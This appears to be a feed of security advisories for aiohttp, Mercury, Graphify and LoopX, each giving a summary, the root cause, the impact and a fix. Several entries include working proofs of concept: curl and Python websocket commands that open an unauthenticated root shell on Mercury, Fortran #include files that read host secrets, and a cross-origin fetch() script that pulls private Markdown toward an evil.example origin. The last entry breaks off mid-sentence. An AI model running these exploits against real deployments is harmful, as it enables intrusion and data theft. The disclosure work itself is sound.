items.title: [aiohttp] aiohttp server lacks an initial request/header timeout
items.summary: SummaryThe keepalive timeout was not used during the initial portion of a request.ImpactAn attacker could keep an idle connection open indefinitely before sending any data.WorkaroundUse a reverse proxy (as recommended for all production deployments) with sensible keepalive limits.Referenceshttps://github.com/aio-libs/aiohttp/security/advisories/GHSA-5wr8-gcqf-gqf3https://github.com/aio-libs/aiohttp/commit/be846822b4b3a5a54b6163e794b42dc06fba54a3https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4https://github.com/advisories/GHSA-5wr8-gcqf-gqf3

items.title: [mercury] Mercury: Stored / DOM Cross-Site Scripting (XSS): mr.Markdown renders untrusted content as raw, unsanitized HTML
items.summary:
SummaryMercury turns Jupyter notebooks into shared web apps/dashboards. The mr.Markdownwidget converts its input to HTML with python-markdown and no sanitizationstep. MarkdownWidget is an ipywidgets.HTML widget, whose value is written tothe page as raw HTML (via innerHTML) with no sanitization, so the resultreaches the DOM verbatim. When an app passes untrusted data (database rows,user submissions, uploaded file contents, or an external/LLM API response) tomr.Markdown, HTML/JS in that data executes in the browser of whoever views theapp — a data-driven stored/DOM-based XSS.This is a library-provided rendering sink that fails to neutralize output; it istriggered by ordinary, reasonable application code, not by an author mistake.Root causemercury/md.py — MarkdownWidget._to_html() (verified at v3.2.6, lines ~57–65):def _to_html(self, text: str) -> str: if md_lib is not None: body = md_lib.markdown(text) # python-markdown: passes raw HTML through else: body = f"
{escape(text)}
" # escape() is ONLY the md-lib-absent fallback return self._apply_inline_theme(body) # regex styling — adds style=, removes nothingTwo neutralization failures compound:Markdown → HTML is unsanitized. python-markdown passes raw HTML through bydefault: , therefore execute when the widget is displayed.On the "sanitize" that exists: mercury_app/notebook_sanitize.py(sanitize_notebook_for_mercury_runtime) and packages/lab/src/mercury/save.ts(sanitizeMercuryNotebookContent) strip runtime metadata and clear code-cellsaved outputs. They do not neutralize HTML/JS, and they do not touch widgetvalues or markdown source. "Sanitize" here is notebook hygiene, not XSS defense.Threat model (attacker → victim, not self-inflicted)The CVE-relevant framing is data-driven: the app author writes ordinary code,and the data is attacker-controlled.import mercury as mr# `row` comes from a DB / user submission / uploaded file / external API —# i.e. NOT authored by the app developer:mr.Markdown(row["comment"])The attacker supplies the untrusted value (posts the comment, uploads the file,poisons the API/RAG source). A different user — another app user, a reviewer,an admin — then opens the app, and the payload executes in their browser. Thevulnerable component (Mercury's server-side widget rendering) and the impactedcomponent (the victim's browser session in the app origin) differ, which is theclassic stored-XSS attacker/victim separation.Amplifier — session sharing (--keep-session). Mercury can serve one sharedkernel session to all viewers (mercury run … --keep-session, README "Arguments":"share the same session between multiple users … others will see this"). It isopt-in and defaults to off (keepSession=False in mercury_app/handlers.py),so it is not required for the base case — any app that renders one user'suntrusted data to another user is already vulnerable. When enabled, content oneviewer submits is rendered into the session other viewers see, extending this tocross-user delivery. Authentication is opt-in and off by default: a freepassword gate exists (mercury run … --pass=…, README), while user-basedauthentication is a paid add-on. Because auth is off unless the operator enablesit, unauthenticated public deployments — where the attacker needs no account — area realistic default.Proof of Conceptimport mercury as mr# Value that would realistically arrive from untrusted data (DB row, form field,# uploaded file, API/LLM response):untrusted = ''mr.Markdown(untrusted) # rendered to raw HTML, unsanitized, into the app DOMThe generated widget HTML contains the payload verbatim; when the widget isdisplayed, the onerror handler runs.What was confirmed (and how)Confirmed by execution in a real browser (sink level): driving the actualpython-markdown output into the same ipywidgets.HTML value sink the widgetuses causes the payload to execute in headless Chromium. Execution was capturedvia Playwright's dialog event (which fires only on a genuine alert(), so themere presence of the string in the HTML cannot cause a false positive). A benigncontrol (**hello**) produced zero dialogs, confirming the harness reportsonly real execution. python-markdown passes throughverbatim by default (behavior is not version-specific).Reasoned from source (not executed end-to-end): the full path

items.title: [mercury] Mercury: Unauthenticated Remote Code Execution in /api/terminals - access control bypass
items.summary:
SummaryA missing comma in mercury_app/block_handler.py's BLOCKED_PATTERNS list causes the blocklist to fail to cover the /api/terminals endpoint. As a result, any unauthenticated attacker can spawn a full, interactive OS-level shell on the host running Mercury.DetailsThe blocklist in mercury_app/block_handler.py is defined as:BLOCKED_PATTERNS = [    # JupyterLab UI + API    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?"    r"/api/terminals(?:/.*)?",    r"/api/shutdown(?:/.*)?",    r"/files(?:/.*)?",]The missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:/lab...(?:/.*)?/api/terminals(?:/.*)? (the first two lines joined together)/api/shutdown(?:/.*)?/files(?:/.*)?A direct request to /api/terminals does not match any of the 3 blocklist rules and is therefore not blocked, reaching JupyterServer's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.PoCTesting was performed on a local Docker deployment (https://runmercury.com/deploy/dockerfile/), Mercury version 3.2.3, defaultconfiguration.Step 1 - spawn a terminal:curl -i -X POST http://localhost:8888/api/terminalsResponse: {"name": "1", "last_activity": "..."}Step 2 - connect to the terminal and execute commands:python3 -c "import websocket, json, timews = websocket.create_connection('ws://localhost:8888/terminals/websocket/1')print(ws.recv())ws.send(json.dumps(['stdin', 'whoami && id
']))time.sleep(1)ws.settimeout(2)try:    while True:        print(ws.recv())except Exception:    pass"Observed output:["setup", {}]["stdout", "# "]["stdout", "whoami && id
"]["stdout", "root
"]["stdout", "uid=0(root) gid=0(root) groups=0(root)
# "]Confirms full, interactive root shell access with no authentication or prior access of any kind.ImpactConfidentiality: full read access to any file the Mercury process can access (notebooks, uploaded data, environment variables, secrets).Integrity: attacker can modify or delete any file, including notebooks served to other users.Availability: attacker can shut down or crash the server/container.Lateral movement: the shell can be used as a foothold to attack other systems reachable from the host's network.Exploitable by any network client that can reach the Mercury server, including the public internet if it is deployed without additional access controls (VPN, reverse-proxy authentication, firewall).FixAdd the missing comma so /api/terminals becomes an independent blocklist rule:BLOCKED_PATTERNS = [    # JupyterLab UI + API    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?",    r"/api/terminals(?:/.*)?",    r"/api/shutdown(?:/.*)?",    r"/files(?:/.*)?",]Referenceshttps://github.com/mljar/mercury/security/advisories/GHSA-f8c7-rwf9-fmgmhttps://github.com/mljar/mercury/commit/8c467129037ee9df269d543ac217ffd33b97bf3fhttps://github.com/mljar/mercury/releases/tag/v3.2.4https://github.com/advisories/GHSA-f8c7-rwf9-fmgm

items.title: [graphifyy] Graphify Fortran extractor: incomplete cpp #include hardening allows arbitrary host-file read/exfiltration when indexing an untrusted repo
items.summary: SummaryThe Fortran extractor's C-preprocessor step (graphify/extractors/fortran.py, _cpp_preprocess) applies an incomplete #include hardening. The -nostdinc -I /dev/null flags it relies on (comment "Security (F-007)") do not stop a capital-F Fortran source file from including absolute paths (#include "/etc/passwd") or from path-traversing out of the corpus (#include "../../../../home/victim/.ssh/id_rsa"). cpp always searches the directory of the file being preprocessed for quoted includes and always honours absolute include paths, regardless of -nostdinc/-I. As a result, indexing an untrusted repository that contains a .F/.F90/.F95/.F03/.F08 file reads arbitrary local files off the host and inlines their contents into the knowledge graph, which is then shipped to the LLM/agent and written to the on-disk, shareable output (graph.json, GRAPH_REPORT.md, the Obsidian wiki, HTML/SVG exports).This is the exact "corpus-side file-exfiltration vector" the F-007 comment says it is defending against; the mitigation is bypassable.SeverityHigh. Arbitrary local-file read on the host, triggered by graphify's core action (indexing an untrusted folder — "turn any folder of code ... into a queryable knowledge graph"), defeating a documented security control. It runs on the default, offline, no-API-key AST path (graphify update . / graphify extract) — no credentials, network, or LLM call required. CWE-73 (external control of file name/path) / CWE-22 (path traversal) / CWE-200 (information exposure).Wheregraphify/extractors/fortran.py, _cpp_preprocess():result = subprocess.run(    ["cpp", "-w", "-P", "-nostdinc", "-I", "/dev/null", str(path.resolve())],    capture_output=True, timeout=30,)Reached from extract_fortran() (same file) for any suffix in _FORTRAN_CPP_EXTS = {".F", ".F90", ".F95", ".F03", ".F08"}, which are collected by default (detect.CODE_EXTENSIONS) and dispatched by extract._DISPATCH.Why the mitigation does not work-nostdinc only removes the standard system include directories, and -I /dev/null only sets the additional search path. Neither affects:Absolute includes — #include "/etc/passwd" is opened directly by cpp.Quoted includes relative to the current file — cpp always searches the directory containing the file being preprocessed for #include "...", so #include "../../../../etc/shadow" traverses out of the corpus.Proof of concept (verified)Reproduced against the shipped code with the exact command _cpp_preprocess builds (cpp -w -P -nostdinc -I /dev/null <file>), and against extract_fortran() directly.Secret on disk (/tmp/secret.txt): TOP_SECRET_...(a) Absolute include — evil_abs.F90:program evil#include "/absolute/path/to/secret.txt"end program evil(b) Relative traversal — evil_rel.F90:program evil#include "../secret.txt"end program evilBoth produce preprocessed output containing the full secret file contents ("SECRET IN OUTPUT: True" for both).Surfacing into the graph — leak.F90 places the include in an identifier position via a free-form continuation so the leaked value becomes a node/edge:module mcontainssubroutine suse &#include "/path/to/token.secret"end subroutine send module mextract_fortran() on this file emits a node whose label is the entire single-line contents of token.secret and an imports edge to it. That node is written to graph.json / GRAPH_REPORT.md / the wiki and returned by the MCP query_graph / get_node / get_neighbors tools — i.e. exfiltrated into the agent's context and into persisted, shareable artifacts.Fidelity note: Fortran is case-insensitive, so captured identifiers are lower-cased. Case-insensitive secrets (file paths, hostnames, usernames, hex tokens, connection-string fragments, and the mere existence/partial content of a readable file) leak cleanly; high-entropy case-sensitive blobs (base64/JWT) are partially corrupted by the lower-casing but still confirm readability and structure. Single-token-per-line secret files (API-key files, single-line credential/token files) leak that token in full (lower-cased). Requires cpp/gcc on PATH (near-ubiquitous on the dev/CI hosts graphify targets); it cleanly falls back to raw bytes when absent.Suggested fixMirror the containment approach already used elsewhere in the codebase (_project_xml_is_safe, security.validate_graph_path): before invoking cpp, scan the source for #include directives and refuse or neutralise any include whose target is absolute or resolves outside the corpus/repo root. Concretely, in _cpp_preprocess:Parse #include "..." / #include <...> directives.Resolve each target against the file's directory; if it is absolute, or its .resolve() escapes the scan root, strip that line (or fall back to path.read_bytes() with no preprocessing).Only allow includes that resolve to a path inside the corpus root.A blunter but safe alternative is to strip all #include lines before preprocessing (macros still expand; cross-file includes lose fidelity but no host files can be read). items.title: [mercury] Mercury: Unauthenticated Remote Code Execution via /api/kernels
items.summary: Mercury runs a JupyterLab server with anonymous access by default (mercury_app/__main__.py sets --IdentityProvider.token='' when no --token/MERCURY_TOKEN is given; when tokenless it also sets --ServerApp.disable_check_xsrf=True). It relies on a blocklist (mercury_app/block_handler.py BLOCKED_PATTERNS: /lab, /api/terminals, /api/shutdown, /files) to keep anonymous users off dangerous Jupyter endpoints.The vulnerability/api/kernels is NOT in the blocklist (and cannot be — Mercury needs kernels to run notebooks), and patch_kernel_websocket_handler() (mercury_app/idle_timeout.py) only tracks the idle-timeout: it wraps on_message to call self.application._timeout_manager.touch() and then invokes the original handler with no filtering of execute_request. So any unauthenticated network client can:POST /api/kernels {"name":"python3"}        -> 201, returns kernel idopen websocket /api/kernels/<id>/channelssend an execute_request with arbitrary code -> arbitrary Python execution = RCEDistinct from GHSA-f8c7-rwf9-fmgm (incomplete fix)GHSA-f8c7 was "Unauthenticated RCE via /api/terminals" — a missing-comma blocklist bypass. Its fix (add the comma so /api/terminals is blocked) does NOT address /api/kernels, which remains exploitable. The blocklist approach is fundamentally unable to cover kernels, so this is not a variant that another blocklist entry fixes.Runtime-proven (on the patched version)On mercury 3.2.4 — the release that fixed GHSA-f8c7 — with the default (tokenless) config, as an unauthenticated client: POST /api/terminals returns 403 (the f8c7 fix is present), but POST /api/kernels returns 201; opening the kernel websocket and sending an execute_request executed attacker-supplied Python (ran whoami as the server process user and wrote a marker file /tmp/PWNED_MERCURY_RCE). Full unauthenticated remote code execution. Deterministic PoC (client script + notebook) included.ImpactUnauthenticated, network-reachable arbitrary code execution as the Mercury server process user on every default deployment — complete compromise of the host/container and any data/secrets it can reach. FixThe blocklist cannot secure an anonymous kernel-backed server. Require real per-request authentication (a token or password) by default, or restrict the kernel message channel so anonymous websocket clients cannot issue execute_request outside Mercury's own controlled execution flow.Dedup (3-method)OSV.dev CLEAN(0) for mercury and mljar-mercury; the repo's only advisory (GHSA-f8c7-rwf9-fmgm) covers /api/terminals only (description does not mention kernels); no issue/PR describes the /api/kernels RCE (#219/#134/#262 are "add auth" feature requests that merely confirm anonymous-by-default). Sink independently confirmed on current HEAD (blocklist omits /api/kernels; token='' default; patch_kernel_websocket_handler does no execute filtering).Finder: Abdullah Kareem (GitHub: CyberKareem).Referenceshttps://github.com/mljar/mercury/security/advisories/GHSA-rv4m-xm3f-3ccqhttps://github.com/mljar/mercury/commit/73a40ceb0becf057f495a5738ad7f5a5222a53e1https://github.com/mljar/mercury/releases/tag/3.2.6https://github.com/advisories/GHSA-rv4m-xm3f-3ccq

items.title: [loopx] LoopX serve-status permissive CORS policy exposes control-plane state and private Markdown files
items.summary:
Summaryloopx serve-status sends Access-Control-Allow-Origin: * on every response,including its unauthenticated GET routes. Because the endpoint is unauthenticated andbound to a fixed, well-known loopback port, any website the operator visits can readLoopX control-plane state and the contents of Markdown files inside every registered goalrepo, using a plain fetch() with no user interaction.The write endpoints are not affected — they are correctly Origin-checked. This report isstrictly about the read paths.ImpactWhile loopx serve-status is running, a page on any origin can run:// no interaction, no preflight, no credentials neededconst s = await (await fetch('http://127.0.0.1:8766/status.json')).json();for (const g of s.goals ?? []) {  const m = await (await fetch(    `http://127.0.0.1:8766/review-material?goal_id=${g.id}&path=design-notes.md`  )).json();  exfiltrate(m.content);}and read back:GET /status.json — the whole status projection: goal ids, run history, and localabsolute paths (registry, runtime_root). With --global-registry this coversevery project registered on the machine, not just one.GET /review-material?goal_id=…&path=… — the content of any .md/.markdownfile under a goal's repo root, state dir, or runtime dir. In practice that is theoperator's private design notes, handoff docs, and evidence write-ups.GET / — endpoint discovery, including which write APIs are enabled.POST /control-plane/configure-goal/dry-run — this route has no Origin check atall, and do_OPTIONS returns Access-Control-Allow-Headers: Content-Type, so across-origin JSON POST passes preflight. The response leaks the before/aftercontrol-plane configuration for a goal. (It does not write — I verified written=false.)docs/public-private-boundary.md classifies "local absolute paths", "task ids", "raw logsand metrics" and "active goal state that reveals current user context" as material thatmust stay private. All of it is currently readable by any origin.Two things make this more than theoretical:Fixed default ports. 8765 (project) and 8766 (global) are hardcoded defaults, soan attacker page can simply try both — no discovery step needed.It is documented as a persistent service. docs/guides/getting-started.md documentsloopx serve-status, and scripts/macos-dashboard-launchagent.sh installs a LaunchAgentthat keeps serve-status --global-registry --port 8766 running after every login. Foranyone following that guide, this is an always-on, machine-wide read surface.I have graded this High on the basis of zero-interaction exfiltration of private localmaterial from a persistent service. It is read-only and scope-limited, so if you read theexposure as lower I would not argue the point — you know your users' setups better than I do.Locationloopx/status_server.py:136-146 — StatusRequestHandler._send_json():def _send_json(self, payload: dict[str, Any], *, status: int = 200) -> None:    ...    self.send_header("Access-Control-Allow-Origin", "*")   # <-- line 142_send_json is the single response path for all routes, so the wildcard is applied to/status.json, /review-material, /healthz, / and the dry-run POSTs alike.do_OPTIONS (:148-153) repeats it.Confirmed present at main HEAD (b0c8e315, blob c9e53d1a) at the time of writing.What is NOT affected (I checked, so you don't have to)I tried to refute this before reporting. These controls all hold:Writes are properly defended. With --enable-reward-write-api and--enable-control-plane-write-api both on, POST /reward/append andPOST /control-plane/configure-goal/apply return 403 "only accepts loopback browserorigins" for a foreign Origin. is_loopback_origin() does its job. There is nocross-origin write, and DNS rebinding does not defeat it either (the rebound page stillcarries its own non-loopback origin).No path traversal. ../../../../etc/hostname → 400; an absolute .md outside thegoal roots → 400 ("outside the goal repo/state/runtime roots"). path_is_under() iscorrect.Extension allowlist holds. secrets.env inside the repo → 400. Only .md/.markdowncan be read.Dry-run does not write. configure_goal_with_global_sync(execute=False) returnsbefore any write; I observed written=false.So the exposure is confined to: status JSON + Markdown under registered goal roots. That isstill private material, but it is not arbitrary file read and it is not remote codeexecution.Proof of conceptRun against an unmodified clone at HEAD, default flags (no write APIs enabled):GET /healthz                 Origin: https://evil.example  -> 200  ACAO: '*'GET /                        Origin: https://evil.example  -> 200  ACAO: '*'GET /status.json             Origin: https://evil.example  -> 200  ACAO: '*'GET /review-material?goal_id=victim-goal&path=internal-design-notes.md                             Origin: https://evil.example  -> 200  ACAO: '*'   content: "# Internal notes

PROD_DB_HOST=db.internal.corp
CONFIDENTIAL: ..."The file content came back verbatim to a foreign origin. Matched controls from the sameharness, with both writ
